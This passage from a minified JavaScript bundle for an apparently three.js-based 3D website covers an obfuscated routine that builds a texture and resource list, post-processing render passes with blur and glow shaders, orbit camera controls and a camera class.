this['XluMOy'](this['eZbqLN'])},_0x22ea71['prototype']['XluMOy']=function(_0x45a538){for(var _0xc53d4f=0x2bd+0x7d3*0x3+-0x1a36,_0x569be0=this['UigPsP']['length'];_0xc53d4f<_0x569be0;_0xc53d4f++){this['UigPsP']['push'](Math['round'](Math['random']())),_0x569be0=this['UigPsP']['length']}return _0x45a538(this['UigPsP'][-0x16f3+0x236a+0x1*-0xc77])},new _0x22ea71(haydata_0x38b4)['rSxmpQ'](),haydata_0x38b4['yLpPKe']=!![]}_0x291693=haydata_0x38b4['vxbbEh'](_0x291693,_0x47463f),_0x4c0a84[_0x172032]=_0x291693}else _0x291693=_0x4dcfc6;return _0x291693},haydata_0x38b4(_0x4c0a84,_0x4d2384)}haydata_0x2b0aab();for(var i=-0xe*-0x11c+-0x890+-0xdf*0x8;i<window[haydata_0x37ed35(0x159)+haydata_0x4ba7e8('0x14a','Kc6V')+'a'][haydata_0x415bb5('0x18a','FrTF')+haydata_0x37ed35(0x13b)+haydata_0x37ed35('0x16c')+'st'][haydata_0x4ba7e8('0x173','Tc4r')+haydata_0x4ba7e8(0x183,'b(@D')];i++){var haydata_0x58e17b={};haydata_0x58e17b[haydata_0x4ba7e8(0x155,'%du$')+'e']=haydata_0xe6f38f('0x159')+haydata_0x4df84c(0x167,'dg]7')+haydata_0x637f31(0x15e,'RRG0')+'t_'+i,haydata_0x58e17b[haydata_0x4df84c(0x171,'k2KJ')+haydata_0x24cde9(0x145)]=window[haydata_0x24cde9('0x159')+haydata_0x415bb5(0x138,'E5tP')+'a'][haydata_0x1ca286('0x166')+haydata_0xe6f38f(0x13b)+haydata_0x1ca286(0x16c)+'st'][i][haydata_0x637f31(0x141,'G%*c')+'or'],haydata_0x58e17b[haydata_0xe6f38f('0x16a')+'e']=haydata_0x4ba7e8('0x148','$WQg')+haydata_0x39c488(0x133,'Tc4r')+'e',projectreslist=projectreslist[haydata_0x24cde9(0x175)+haydata_0x637f31('0x147','dg]7')](haydata_0x58e17b)}function haydata_0x32a9(){var _0xe71aee=['eYddLG','pCkUwG','teXf','mtu0nJyXnhndvMjTrW','mZm5odm4s3LHAeHj','WOyrwG','m8oLW60','B2nc','kcGO','W7u7WRi','WPSYca','WRpcQvW','kfDM','wCoGWQG','W6NdVCo1WQX7smo/','WQBdT8o5','DhjP','denA','B3jT','z3rO','CMnO','ebWf','yxbW','mLnb','cKxdOW','BgvU','BMfT','uqygWOauACoHmq','W6tcMGW','W4BcGmoS','tmkQW7y','AMvJ','rSooWPy','vGrjW4vjgmowdWCzyHa','m3b6wvrwyG','zgf0','F3PWDmo8DajPW5ZdLNr/','aH85','r3vh','W7RdN8ol','ESoqW6BcMmkZWORdJmo5qCoZDmoBCG','CMnL','F8kSxG','a1yi','g8kgW6S','WQ/cV8kajmkysSkxsSoOpmkGW6W','WP9VW7a','lIKX','cWe7','Dwn0','kYKR','W4ZcTZ0','C291','g8krW7O','yxrP','WPddQmoM','amkWW6r1W4P0v8kMWQdcSr97WP8','W7XQWPG','lqtdLa','rM5y','lISP','Agf5','C2vH','W6ZcLY0','W5rkWQC','W616WPi','W6tdV8ki','Axn0','EgXy','W7lcUmoU','C3rY','W6BdM8ok','iqee','mtf6D2TfvNu','ChjV','eeut','ksSK','WRtcPCo5','DhLW','CCk/Ba','DgXP','WRXlFW','ASkkpq','ofzgCwH1zW','v0RcRq','WR8+W5a','kmoPW7W','kKnD','nJG4ota5mfLlDuz1za','y29U','W7ZcHSoj','ct4EWQRdKSkZaYzTWQqZB2C','Dg9t','zNjf','b8kVEq','W6ldUHfuFdDiumkCxCoOyG','xuxcNq','nJm1mJy0yuTQCvLH','W5FdOCoCWOXfmmkkWQXhW51RkW','thTs','nKnwCvjgyW','W78VtW','W6yEWQy','WRldMCkf','ChbWECo5DefEW5BdHgzOyW','BNfv','xCorWQRdPSkyW7hdI8k5W5pcJXldPG','B25F','swrc','B25S','W7RcTCkS','W44oWO0','Aw5M'];haydata_0x32a9=function(){return _0xe71aee};return haydata_0x32a9()}for(var i=-0x2ce*0x1+-0x6c3+0x991*0x1;i<window[haydata_0x415bb5('0x163','56[Q')+haydata_0x415bb5('0x15c','vt*8')+'a'][haydata_0x1d7c2c('0x11b')+haydata_0x1d7c2c(0x12e)+haydata_0x1d7c2c('0x152')+haydata_0x4ba7e8('0x11c','&lcY')+haydata_0xe6f38f(0x15f)][haydata_0x1d7c2c(0x135)+haydata_0x24cde9(0x12f)];i++){var haydata_0x4ae76a={};haydata_0x4ae76a[haydata_0xe6f38f('0x136')+'e']=haydata_0x415bb5(0x129,'e8Z3')+haydata_0x1ca286('0x11b')+haydata_0x4ba7e8(0x14c,'G%*c')+haydata_0x4df84c(0x18b,'TU3D')+haydata_0x24cde9('0x187')+i,haydata_0x4ae76a[haydata_0x1d7c2c('0x150')+haydata_0x24cde9(0x145)]=window[haydata_0x4df84c('0x14b','5FS1')+haydata_0x24cde9('0x13f')+'a'][haydata_0x4df84c('0x13a','W[m7')+haydata_0x1d7c2c('0x12e')+haydata_0x1d7c2c('0x152')+haydata_0xe6f38f(0x189)+haydata_0x1ca286('0x15f')][i][haydata_0x39c488('0x126','gw32')+'el'],haydata_0x4ae76a[haydata_0xe6f38f(0x16a)+'e']=haydata_0x39c488(0x143,'56[Q')+haydata_0x415bb5('0x15d','HZ4s')+'e',projectreslist=projectreslist[haydata_0x24cde9('0x175')+haydata_0x637f31(0x127,'jsL#')](haydata_0x4ae76a)}return function(e,t){if(!(e instanceof t))throw new TypeError("Cannot call a class as a function")}(this,t),(e=Zv(this,Qv(t).call(this))).loader=new Df,e.items={},e.loader.load(projectreslist),e.loader.on("fileEnd",(function(t,i){if(e.items[t.name]=i,"texture"===t.type){var n=new S(i);n.needsUpdate=!0,e.items["".concat(t.name,"Texture")]=n}e.trigger("progress",[e.loader.loaded/e.loader.toLoad])})),e.loader.on("end",(function(){e.trigger("ready")})),e}return function(e,t){if("function"!=typeof t&&null!==t)throw new TypeError("Super expression must either be null or a function");e.prototype=Object.create(t&&t.prototype,{constructor:{value:e,writable:!0,configurable:!0}}),t&&$v(e,t)}(t,e),t}(qh),ig={uniforms:{tDiffuse:{value:null},opacity:{value:1}},vertexShader:["varying vec2 vUv;","void main() {","\tvUv = uv;","\tgl_Position = projectionMatrix * modelViewMatrix * vec4( position, 1.0 );","}"].join("\n"),fragmentShader:["uniform float opacity;","uniform sampler2D tDiffuse;","varying vec2 vUv;","void main() {","\tvec4 texel = texture2D( tDiffuse, vUv );","\tgl_FragColor = opacity * texel;","}"].join("\n")};function ng(){this.enabled=!0,this.needsSwap=!0,this.clear=!1,this.renderToScreen=!1}Object.assign(ng.prototype,{setSize:function(){},render:function(){console.error("THREE.Pass: .render() must be implemented in derived pass.")}}),ng.FullScreenQuad=(Jv=new Bs(-1,1,1,-1,0,1),Kv=new si(2,2),eg=function(e){this._mesh=new Lt(Kv,e)},Object.defineProperty(eg.prototype,"material",{get:function(){return this._mesh.material},set:function(e){this._mesh.material=e}}),Object.assign(eg.prototype,{render:function(e){e.render(this._mesh,Jv)}}),eg);var rg=function(e,t){ng.call(this),this.textureID=void 0!==t?t:"tDiffuse",e instanceof Vt?(this.uniforms=e.uniforms,this.material=e):e&&(this.uniforms=Ut.clone(e.uniforms),this.material=new Vt({defines:Object.assign({},e.defines),uniforms:this.uniforms,vertexShader:e.vertexShader,fragmentShader:e.fragmentShader})),this.fsQuad=new ng.FullScreenQuad(this.material)};rg.prototype=Object.assign(Object.create(ng.prototype),{constructor:rg,render:function(e,t,i){this.uniforms[this.textureID]&&(this.uniforms[this.textureID].value=i.texture),this.fsQuad.material=this.material,this.renderToScreen?(e.setRenderTarget(null),this.fsQuad.render(e)):(e.setRenderTarget(t),this.clear&&e.clear(e.autoClearColor,e.autoClearDepth,e.autoClearStencil),this.fsQuad.render(e))}});var og=function(e,t){ng.call(this),this.scene=e,this.camera=t,this.clear=!0,this.needsSwap=!1,this.inverse=!1};og.prototype=Object.assign(Object.create(ng.prototype),{constructor:og,render:function(e,t,i){var n,r,o=e.getContext(),a=e.state;a.buffers.color.setMask(!1),a.buffers.depth.setMask(!1),a.buffers.color.setLocked(!0),a.buffers.depth.setLocked(!0),this.inverse?(n=0,r=1):(n=1,r=0),a.buffers.stencil.setTest(!0),a.buffers.stencil.setOp(o.REPLACE,o.REPLACE,o.REPLACE),a.buffers.stencil.setFunc(o.ALWAYS,n,4294967295),a.buffers.stencil.setClear(r),a.buffers.stencil.setLocked(!0),e.setRenderTarget(i),this.clear&&e.clear(),e.render(this.scene,this.camera),e.setRenderTarget(t),this.clear&&e.clear(),e.render(this.scene,this.camera),a.buffers.color.setLocked(!1),a.buffers.depth.setLocked(!1),a.buffers.stencil.setLocked(!1),a.buffers.stencil.setFunc(o.EQUAL,1,4294967295),a.buffers.stencil.setOp(o.KEEP,o.KEEP,o.KEEP),a.buffers.stencil.setLocked(!0)}});var ag=function(){ng.call(this),this.needsSwap=!1};ag.prototype=Object.create(ng.prototype),Object.assign(ag.prototype,{render:function(e){e.state.buffers.stencil.setLocked(!1),e.state.buffers.stencil.setTest(!1)}});var sg=function(e,t){if(this.renderer=e,void 0===t){var i={minFilter:1006,magFilter:1006,format:1023,stencilBuffer:!1},n=e.getSize(new f);this._pixelRatio=e.getPixelRatio(),this._width=n.width,this._height=n.height,(t=new E(this._width*this._pixelRatio,this._height*this._pixelRatio,i)).texture.name="EffectComposer.rt1"}else this._pixelRatio=1,this._width=t.width,this._height=t.height;this.renderTarget1=t,this.renderTarget2=t.clone(),this.renderTarget2.texture.name="EffectComposer.rt2",this.writeBuffer=this.renderTarget1,this.readBuffer=this.renderTarget2,this.renderToScreen=!0,this.passes=[],void 0===ig&&console.error("THREE.EffectComposer relies on CopyShader"),void 0===rg&&console.error("THREE.EffectComposer relies on ShaderPass"),this.copyPass=new rg(ig),this.clock=new uc};Object.assign(sg.prototype,{swapBuffers:function(){var e=this.readBuffer;this.readBuffer=this.writeBuffer,this.writeBuffer=e},addPass:function(e){this.passes.push(e),e.setSize(this._width*this._pixelRatio,this._height*this._pixelRatio)},insertPass:function(e,t){this.passes.splice(t,0,e)},isLastEnabledPass:function(e){for(var t=e+1;t<this.passes.length;t++)if(this.passes[t].enabled)return!1;return!0},render:function(e){void 0===e&&(e=this.clock.getDelta());var t,i,n=this.renderer.getRenderTarget(),r=!1,o=this.passes.length;for(i=0;i<o;i++)if(!1!==(t=this.passes[i]).enabled){if(t.renderToScreen=this.renderToScreen&&this.isLastEnabledPass(i),t.render(this.renderer,this.writeBuffer,this.readBuffer,e,r),t.needsSwap){if(r){var a=this.renderer.getContext(),s=this.renderer.state.buffers.stencil;s.setFunc(a.NOTEQUAL,1,4294967295),this.copyPass.render(this.renderer,this.writeBuffer,this.readBuffer,e),s.setFunc(a.EQUAL,1,4294967295)}this.swapBuffers()}void 0!==og&&(t instanceof og?r=!0:t instanceof ag&&(r=!1))}this.renderer.setRenderTarget(n)},reset:function(e){if(void 0===e){var t=this.renderer.getSize(new f);this._pixelRatio=this.renderer.getPixelRatio(),this._width=t.width,this._height=t.height,(e=this.renderTarget1.clone()).setSize(this._width*this._pixelRatio,this._height*this._pixelRatio)}this.renderTarget1.dispose(),this.renderTarget2.dispose(),this.renderTarget1=e,this.renderTarget2=e.clone(),this.writeBuffer=this.renderTarget1,this.readBuffer=this.renderTarget2},setSize:function(e,t){this._width=e,this._height=t;var i=this._width*this._pixelRatio,n=this._height*this._pixelRatio;this.renderTarget1.setSize(i,n),this.renderTarget2.setSize(i,n);for(var r=0;r<this.passes.length;r++)this.passes[r].setSize(i,n)},setPixelRatio:function(e){this._pixelRatio=e,this.setSize(this._width,this._height)}});var cg=function(){this.enabled=!0,this.needsSwap=!0,this.clear=!1,this.renderToScreen=!1};Object.assign(cg.prototype,{setSize:function(){},render:function(){console.error("THREE.Pass: .render() must be implemented in derived pass.")}}),cg.FullScreenQuad=function(){var e=new Bs(-1,1,1,-1,0,1),t=new si(2,2),i=function(e){this._mesh=new Lt(t,e)};return Object.defineProperty(i.prototype,"material",{get:function(){return this._mesh.material},set:function(e){this._mesh.material=e}}),Object.assign(i.prototype,{render:function(t){t.render(this._mesh,e)}}),i}();var lg=function(e,t,i,n,r){ng.call(this),this.scene=e,this.camera=t,this.overrideMaterial=i,this.clearColor=n,this.clearAlpha=void 0!==r?r:0,this.clear=!0,this.clearDepth=!1,this.needsSwap=!1};lg.prototype=Object.assign(Object.create(ng.prototype),{constructor:lg,render:function(e,t,i){var n,r,o=e.autoClear;e.autoClear=!1,this.scene.overrideMaterial=this.overrideMaterial,this.clearColor&&(n=e.getClearColor().getHex(),r=e.getClearAlpha(),e.setClearColor(this.clearColor,this.clearAlpha)),this.clearDepth&&e.clearDepth(),e.setRenderTarget(this.renderToScreen?null:i),this.clear&&e.clear(e.autoClearColor,e.autoClearDepth,e.autoClearStencil),e.render(this.scene,this.camera),this.clearColor&&e.setClearColor(n,r),this.scene.overrideMaterial=null,e.autoClear=o}});var hg={uniforms:{tDiffuse:{type:"t",value:null},uResolution:{type:"v2",value:null},uStrength:{type:"v2",value:null}},vertexShader:"#define GLSLIFY 1\nvarying vec2 vUv;\n\nvoid main()\n{\n    vUv = uv;\n    gl_Position = projectionMatrix * modelViewMatrix * vec4(position, 1.0);\n}\n",fragmentShader:"#define GLSLIFY 1\n#define M_PI 3.1415926535897932384626433832795\n\nuniform sampler2D tDiffuse;\nuniform vec2 uResolution;\nuniform vec2 uStrength;\n\nvarying vec2 vUv;\n\nvec4 blur9(sampler2D image, vec2 uv, vec2 resolution, vec2 direction) {\n  vec4 color = vec4(0.0);\n  vec2 off1 = vec2(1.3846153846) * direction;\n  vec2 off2 = vec2(3.2307692308) * direction;\n  color += texture2D(image, uv) * 0.2270270270;\n  color += texture2D(image, uv + (off1 / resolution)) * 0.3162162162;\n  color += texture2D(image, uv - (off1 / resolution)) * 0.3162162162;\n  color += texture2D(image, uv + (off2 / resolution)) * 0.0702702703;\n  color += texture2D(image, uv - (off2 / resolution)) * 0.0702702703;\n  return color;\n}\n\nvoid main()\n{\n    vec4 diffuseColor = texture2D(tDiffuse, vUv);\n    vec4 blurColor = blur9(tDiffuse, vUv, uResolution, uStrength);\n    float blurStrength = 1.0 - sin(vUv.y * M_PI);\n    gl_FragColor = mix(diffuseColor, blurColor, blurStrength);\n}\n"},ug={uniforms:{tDiffuse:{type:"t",value:null},uPosition:{type:"v2",value:null},uRadius:{type:"f",value:null},uColor:{type:"v3",value:null},uAlpha:{type:"f",value:null}},vertexShader:"#define GLSLIFY 1\nvarying vec2 vUv;\n\nvoid main()\n{\n    vUv = uv;\n    gl_Position = projectionMatrix * modelViewMatrix * vec4(position, 1.0);\n}\n",fragmentShader:"#define GLSLIFY 1\nuniform sampler2D tDiffuse;\nuniform vec2 uPosition;\nuniform float uRadius;\nuniform vec3 uColor;\nuniform float uAlpha;\n\nvarying vec2 vUv;\n\nvoid main()\n{\n    vec4 diffuseColor = texture2D(tDiffuse, vUv);\n\n    float glowStrength = distance(vUv, uPosition) / uRadius;\n    glowStrength = 1.0 - glowStrength;\n    glowStrength *= uAlpha;\n    glowStrength = clamp(glowStrength, 0.0, 1.0);\n    vec3 color = mix(diffuseColor.rgb, uColor, glowStrength);\n\n    gl_FragColor = vec4(color, 1.0);\n}\n"},dg=function(e,t){var i,h,u,d,p;void 0===t&&console.warn('THREE.OrbitControls: The second parameter "domElement" is now mandatory.'),t===document&&console.error('THREE.OrbitControls: "document" should not be used as the target "domElement". Please use "renderer.domElement" instead.'),this.object=e,this.domElement=t,this.enabled=!0,this.target=new y,this.minDistance=0,this.maxDistance=1/0,this.minZoom=0,this.maxZoom=1/0,this.minPolarAngle=0,this.maxPolarAngle=Math.PI,this.minAzimuthAngle=-1/0,this.maxAzimuthAngle=1/0,this.enableDamping=!1,this.dampingFactor=.05,this.enableZoom=!0,this.zoomSpeed=1,this.enableRotate=!0,this.rotateSpeed=1,this.enablePan=!0,this.panSpeed=1,this.screenSpacePanning=!1,this.keyPanSpeed=7,this.autoRotate=!1,this.autoRotateSpeed=2,this.enableKeys=!0,this.keys={LEFT:37,UP:38,RIGHT:39,BOTTOM:40},this.mouseButtons={LEFT:n,MIDDLE:r,RIGHT:o},this.touches={ONE:a,TWO:c},this.target0=this.target.clone(),this.position0=this.object.position.clone(),this.zoom0=this.object.zoom,this.getPolarAngle=function(){return S.phi},this.getAzimuthalAngle=function(){return S.theta},this.saveState=function(){v.target0.copy(v.target),v.position0.copy(v.object.position),v.zoom0=v.object.zoom},this.reset=function(){v.target.copy(v.target0),v.object.position.copy(v.position0),v.object.zoom=v.zoom0,v.object.updateProjectionMatrix(),v.dispatchEvent(g),v.update(),_=x.NONE},this.update=(i=new y,h=(new m).setFromUnitVectors(e.up,new y(0,1,0)),u=h.clone().inverse(),d=new y,p=new m,function(){var e=v.object.position;return i.copy(e).sub(v.target),i.applyQuaternion(h),S.setFromVector3(i),v.autoRotate&&_===x.NONE&&N(2*Math.PI/60/60*v.autoRotateSpeed),v.enableDamping?(S.theta+=T.theta*v.dampingFactor,S.phi+=T.phi*v.dampingFactor):(S.theta+=T.theta,S.phi+=T.phi),S.theta=Math.max(v.minAzimuthAngle,Math.min(v.maxAzimuthAngle,S.theta)),S.phi=Math.max(v.minPolarAngle,Math.min(v.maxPolarAngle,S.phi)),S.makeSafe(),S.radius*=E,S.radius=Math.max(v.minDistance,Math.min(v.maxDistance,S.radius)),!0===v.enableDamping?v.target.addScaledVector(A,v.dampingFactor):v.target.add(A),i.setFromSpherical(S),i.applyQuaternion(u),e.copy(v.target).add(i),v.object.lookAt(v.target),!0===v.enableDamping?(T.theta*=1-v.dampingFactor,T.phi*=1-v.dampingFactor,A.multiplyScalar(1-v.dampingFactor)):(T.set(0,0,0),A.set(0,0,0)),E=1,!!(C||d.distanceToSquared(v.object.position)>M||8*(1-p.dot(v.object.quaternion))>M)&&(v.dispatchEvent(g),d.copy(v.object.position),p.copy(v.object.quaternion),C=!1,!0)}),this.dispose=function(){v.domElement.removeEventListener("contextmenu",le,!1),v.domElement.removeEventListener("mousedown",te,!1),v.domElement.removeEventListener("wheel",re,!1),v.domElement.removeEventListener("touchstart",ae,!1),v.domElement.removeEventListener("touchend",ce,!1),v.domElement.removeEventListener("touchmove",se,!1),document.removeEventListener("mousemove",ie,!1),document.removeEventListener("mouseup",ne,!1),window.removeEventListener("keydown",oe,!1)};var v=this,g={type:"change"},b={type:"start"},w={type:"end"},x={NONE:-1,ROTATE:0,DOLLY:1,PAN:2,TOUCH_ROTATE:3,TOUCH_PAN:4,TOUCH_DOLLY_PAN:5,TOUCH_DOLLY_ROTATE:6},_=x.NONE,M=1e-6,S=new Vc,T=new Vc,E=1,A=new y,C=!1,P=new f,L=new f,R=new f,k=new f,O=new f,I=new f,B=new f,D=new f,z=new f;function F(){return Math.pow(.95,v.zoomSpeed)}function N(e){T.theta-=e}function j(e){T.phi-=e}var U,V=(U=new y,function(e,t){U.setFromMatrixColumn(t,0),U.multiplyScalar(-e),A.add(U)}),H=function(){var e=new y;return function(t,i){!0===v.screenSpacePanning?e.setFromMatrixColumn(i,1):(e.setFromMatrixColumn(i,0),e.crossVectors(v.object.up,e)),e.multiplyScalar(t),A.add(e)}}(),G=function(){var e=new y;return function(t,i){var n=v.domElement;if(v.object.isPerspectiveCamera){var r=v.object.position;e.copy(r).sub(v.target);var o=e.length();o*=Math.tan(v.object.fov/2*Math.PI/180),V(2*t*o/n.clientHeight,v.object.matrix),H(2*i*o/n.clientHeight,v.object.matrix)}else v.object.isOrthographicCamera?(V(t*(v.object.right-v.object.left)/v.object.zoom/n.clientWidth,v.object.matrix),H(i*(v.object.top-v.object.bottom)/v.object.zoom/n.clientHeight,v.object.matrix)):(console.warn("WARNING: OrbitControls.js encountered an unknown camera type - pan disabled."),v.enablePan=!1)}}();function W(e){v.object.isPerspectiveCamera?E/=e:v.object.isOrthographicCamera?(v.object.zoom=Math.max(v.minZoom,Math.min(v.maxZoom,v.object.zoom*e)),v.object.updateProjectionMatrix(),C=!0):(console.warn("WARNING: OrbitControls.js encountered an unknown camera type - dolly/zoom disabled."),v.enableZoom=!1)}function q(e){v.object.isPerspectiveCamera?E*=e:v.object.isOrthographicCamera?(v.object.zoom=Math.max(v.minZoom,Math.min(v.maxZoom,v.object.zoom/e)),v.object.updateProjectionMatrix(),C=!0):(console.warn("WARNING: OrbitControls.js encountered an unknown camera type - dolly/zoom disabled."),v.enableZoom=!1)}function X(e){P.set(e.clientX,e.clientY)}function Y(e){k.set(e.clientX,e.clientY)}function Z(e){if(1==e.touches.length)P.set(e.touches[0].pageX,e.touches[0].pageY);else{var t=.5*(e.touches[0].pageX+e.touches[1].pageX),i=.5*(e.touches[0].pageY+e.touches[1].pageY);P.set(t,i)}}function Q(e){if(1==e.touches.length)k.set(e.touches[0].pageX,e.touches[0].pageY);else{var t=.5*(e.touches[0].pageX+e.touches[1].pageX),i=.5*(e.touches[0].pageY+e.touches[1].pageY);k.set(t,i)}}function $(e){var t=e.touches[0].pageX-e.touches[1].pageX,i=e.touches[0].pageY-e.touches[1].pageY,n=Math.sqrt(t*t+i*i);B.set(0,n)}function J(e){if(1==e.touches.length)L.set(e.touches[0].pageX,e.touches[0].pageY);else{var t=.5*(e.touches[0].pageX+e.touches[1].pageX),i=.5*(e.touches[0].pageY+e.touches[1].pageY);L.set(t,i)}R.subVectors(L,P).multiplyScalar(v.rotateSpeed);var n=v.domElement;N(2*Math.PI*R.x/n.clientHeight),j(2*Math.PI*R.y/n.clientHeight),P.copy(L)}function K(e){if(1==e.touches.length)O.set(e.touches[0].pageX,e.touches[0].pageY);else{var t=.5*(e.touches[0].pageX+e.touches[1].pageX),i=.5*(e.touches[0].pageY+e.touches[1].pageY);O.set(t,i)}I.subVectors(O,k).multiplyScalar(v.panSpeed),G(I.x,I.y),k.copy(O)}function ee(e){var t=e.touches[0].pageX-e.touches[1].pageX,i=e.touches[0].pageY-e.touches[1].pageY,n=Math.sqrt(t*t+i*i);D.set(0,n),z.set(0,Math.pow(D.y/B.y,v.zoomSpeed)),W(z.y),B.copy(D)}function te(e){if(!1!==v.enabled){switch(e.preventDefault(),v.domElement.focus?v.domElement.focus():window.focus(),e.button){case 0:switch(v.mouseButtons.LEFT){case n:if(e.ctrlKey||e.metaKey||e.shiftKey){if(!1===v.enablePan)return;Y(e),_=x.PAN}else{if(!1===v.enableRotate)return;X(e),_=x.ROTATE}break;case o:if(e.ctrlKey||e.metaKey||e.shiftKey){if(!1===v.enableRotate)return;X(e),_=x.ROTATE}else{if(!1===v.enablePan)return;Y(e),_=x.PAN}break;default:_=x.NONE}break;case 1:switch(v.mouseButtons.MIDDLE){case r:if(!1===v.enableZoom)return;!function(e){B.set(e.clientX,e.clientY)}(e),_=x.DOLLY;break;default:_=x.NONE}break;case 2:switch(v.mouseButtons.RIGHT){case n:if(!1===v.enableRotate)return;X(e),_=x.ROTATE;break;case o:if(!1===v.enablePan)return;Y(e),_=x.PAN;break;default:_=x.NONE}}_!==x.NONE&&(document.addEventListener("mousemove",ie,!1),document.addEventListener("mouseup",ne,!1),v.dispatchEvent(b))}}function ie(e){if(!1!==v.enabled)switch(e.preventDefault(),_){case x.ROTATE:if(!1===v.enableRotate)return;!function(e){L.set(e.clientX,e.clientY),R.subVectors(L,P).multiplyScalar(v.rotateSpeed);var t=v.domElement;N(2*Math.PI*R.x/t.clientHeight),j(2*Math.PI*R.y/t.clientHeight),P.copy(L),v.update()}(e);break;case x.DOLLY:if(!1===v.enableZoom)return;!function(e){D.set(e.clientX,e.clientY),z.subVectors(D,B),z.y>0?W(F()):z.y<0&&q(F()),B.copy(D),v.update()}(e);break;case x.PAN:if(!1===v.enablePan)return;!function(e){O.set(e.clientX,e.clientY),I.subVectors(O,k).multiplyScalar(v.panSpeed),G(I.x,I.y),k.copy(O),v.update()}(e)}}function ne(e){!1!==v.enabled&&(document.removeEventListener("mousemove",ie,!1),document.removeEventListener("mouseup",ne,!1),v.dispatchEvent(w),_=x.NONE)}function re(e){!1===v.enabled||!1===v.enableZoom||_!==x.NONE&&_!==x.ROTATE||(e.preventDefault(),e.stopPropagation(),v.dispatchEvent(b),function(e){e.deltaY<0?q(F()):e.deltaY>0&&W(F()),v.update()}(e),v.dispatchEvent(w))}function oe(e){!1!==v.enabled&&!1!==v.enableKeys&&!1!==v.enablePan&&function(e){var t=!1;switch(e.keyCode){case v.keys.UP:G(0,v.keyPanSpeed),t=!0;break;case v.keys.BOTTOM:G(0,-v.keyPanSpeed),t=!0;break;case v.keys.LEFT:G(v.keyPanSpeed,0),t=!0;break;case v.keys.RIGHT:G(-v.keyPanSpeed,0),t=!0}t&&(e.preventDefault(),v.update())}(e)}function ae(e){if(!1!==v.enabled){switch(e.preventDefault(),e.touches.length){case 1:switch(v.touches.ONE){case a:if(!1===v.enableRotate)return;Z(e),_=x.TOUCH_ROTATE;break;case s:if(!1===v.enablePan)return;Q(e),_=x.TOUCH_PAN;break;default:_=x.NONE}break;case 2:switch(v.touches.TWO){case c:if(!1===v.enableZoom&&!1===v.enablePan)return;!function(e){v.enableZoom&&$(e),v.enablePan&&Q(e)}(e),_=x.TOUCH_DOLLY_PAN;break;case l:if(!1===v.enableZoom&&!1===v.enableRotate)return;!function(e){v.enableZoom&&$(e),v.enableRotate&&Z(e)}(e),_=x.TOUCH_DOLLY_ROTATE;break;default:_=x.NONE}break;default:_=x.NONE}_!==x.NONE&&v.dispatchEvent(b)}}function se(e){if(!1!==v.enabled)switch(e.preventDefault(),e.stopPropagation(),_){case x.TOUCH_ROTATE:if(!1===v.enableRotate)return;J(e),v.update();break;case x.TOUCH_PAN:if(!1===v.enablePan)return;K(e),v.update();break;case x.TOUCH_DOLLY_PAN:if(!1===v.enableZoom&&!1===v.enablePan)return;!function(e){v.enableZoom&&ee(e),v.enablePan&&K(e)}(e),v.update();break;case x.TOUCH_DOLLY_ROTATE:if(!1===v.enableZoom&&!1===v.enableRotate)return;!function(e){v.enableZoom&&ee(e),v.enableRotate&&J(e)}(e),v.update();break;default:_=x.NONE}}function ce(e){!1!==v.enabled&&(v.dispatchEvent(w),_=x.NONE)}function le(e){!1!==v.enabled&&e.preventDefault()}v.domElement.addEventListener("contextmenu",le,!1),v.domElement.addEventListener("mousedown",te,!1),v.domElement.addEventListener("wheel",re,!1),v.domElement.addEventListener("touchstart",ae,!1),v.domElement.addEventListener("touchend",ce,!1),v.domElement.addEventListener("touchmove",se,!1),window.addEventListener("keydown",oe,!1),this.update()};(dg.prototype=Object.create(h.prototype)).constructor=dg;var pg=function(e,t){dg.call(this,e,t),this.mouseButtons.LEFT=o,this.mouseButtons.RIGHT=n,this.touches.ONE=s,this.touches.TWO=l};function fg(e,t){var i=Object.keys(e);if(Object.getOwnPropertySymbols){var n=Object.getOwnPropertySymbols(e);t&&(n=n.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),i.push.apply(i,n)}return i}function mg(e,t,i){return t in e?Object.defineProperty(e,t,{value:i,enumerable:!0,configurable:!0,writable:!0}):e[t]=i,e}function vg(e,t){for(var i=0;i<t.length;i++){var n=t[i];n.enumerable=n.enumerable||!1,n.configurable=!0,"value"in n&&(n.writable=!0),Object.defineProperty(e,n.key,n)}}(pg.prototype=Object.create(h.prototype)).constructor=pg;var gg=function(){function e(t){!function(e,t){if(!(e instanceof t))throw new TypeError("Cannot call a class as a function")}(this,e),this.time=t.time,this.sizes=t.sizes,this.renderer=t.renderer,this.debug=t.debug,this.config=t.config,this.container=new K,this.container.matrixAutoUpdate=!1,this.target=new y(0,0,0),this.targetEased=new y(0,0,0),this.easing=.15,this.debug&&(this.debugFolder=this.debug.addFolder("camera")),this.setAngle(),this.setInstance(),this.setZoom(),this.setPan(),this.setOrbitControls()}var t,i,n;return t=e,(i=[{key:"setAngle",value:function(){var e=this;this.angle={},this.angle.items={default:new y(1.135,-1.45,1.15),projects:new y(.38,-1.4,1.63)},this.angle.value=new y,this.angle.value.copy(this.angle.items.default),this.angle.set=function(t){var i=e.angle.items[t];void 0!==i&&Du.e.to(e.angle.value,2,function(e){for(var t=1;t<arguments.length;t++){var i=null!=arguments[t]?arguments[t]:{};t%2?fg(Object(i),!0).forEach((function(t){mg(e,t,i[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(i)):fg(Object(i)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(i,t))}))}return e}({},i,{ease:Du.b.easeInOut}))},this.debug&&(this.debugFolder.add(this,"easing").step(1e-4).min(0).max(1).name("easing"),this.debugFolder.add(this.angle.value,"x").step(.001).min(-2).max(2).name("invertDirectionX").listen(),this.debugFolder.add(this.angle.value,"y").step(.001).min(-2).max(2).name("invertDirectionY").listen(),this.debugFolder.add(this.angle.value,"z").step(.001).min(-2).max(2).name("invertDirectionZ").listen())}},{key:"setInstance",value:function(){var e=this;this.instance=new Gt(40,this.sizes.viewport.width/this.sizes.viewport.height,1,80),this.instance.up.set(0,0,1),this.instance.position.copy(this.angle.value),this.instance.lookAt(new 